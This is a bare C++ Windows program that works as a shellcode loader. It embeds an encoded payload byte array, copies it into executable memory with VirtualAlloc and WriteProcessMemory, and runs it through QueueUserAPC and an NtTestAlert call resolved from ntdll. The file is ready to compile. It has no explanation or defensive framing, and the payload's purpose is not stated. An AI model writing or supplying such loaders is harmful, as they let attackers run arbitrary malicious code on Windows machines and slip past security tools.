#include<Windows.h>
#include<iostream>
#pragma comment(lib,"ntdll")

int main() {

	unsigned char buf[] = "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
		"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
		"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
		"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
		"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
		"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
		"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
		"\x1c\x39\xbd";
	NTSTATUS(NTAPI*testalert)() = (NTSTATUS(NTAPI*)())(GetProcAddress(GetModuleHandleA("ntdll"),"NtTestAlert"));
	SIZE_T siz = sizeof(buf);
	
	LPVOID shelladdress = VirtualAlloc(NULL, siz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(GetCurrentProcess(), shelladdress, buf, siz, NULL);
	std::cout << (DWORD)shelladdress <<" " << shelladdress<< std::endl;
	PTHREAD_START_ROUTINE apcroutine = (PTHREAD_START_ROUTINE)shelladdress;
	QueueUserAPC((PAPCFUNC)apcroutine, GetCurrentThread(), NULL);
	testalert();
	
	return 0;
}